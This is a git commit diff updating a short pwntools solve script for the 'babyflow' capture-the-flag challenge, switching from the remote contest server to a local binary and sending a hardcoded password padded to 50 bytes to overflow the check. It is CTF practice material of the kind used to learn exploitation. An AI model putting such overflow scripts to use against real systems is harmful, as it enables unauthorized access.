0884ee10334b70f66b80270adc3ca79bcba9fd5c
faviconico1910 <23521179@gm.uit.edu.vn>
2024-11-23 23:09:13 +0700

    update script for babyflow

--- 1337/babyflow/bbflow.py
+++ 1337/babyflow/bbflow.py
@@ -1,10 +1,12 @@
 #!/usr/bin/python3
 
 from pwn import *
-p = remote('babyflow.ctf.intigriti.io', 1331)
+# p = remote('babyflow.ctf.intigriti.io', 1331)
+p = process('./babyflow')
 passwd = b'SuPeRsEcUrEPaSsWoRd123'
 passwd = passwd.ljust(50)
-p.sendafter(b'Enter password: ', passwd)
+
+p.send(passwd)
 
 
 p.interactive()
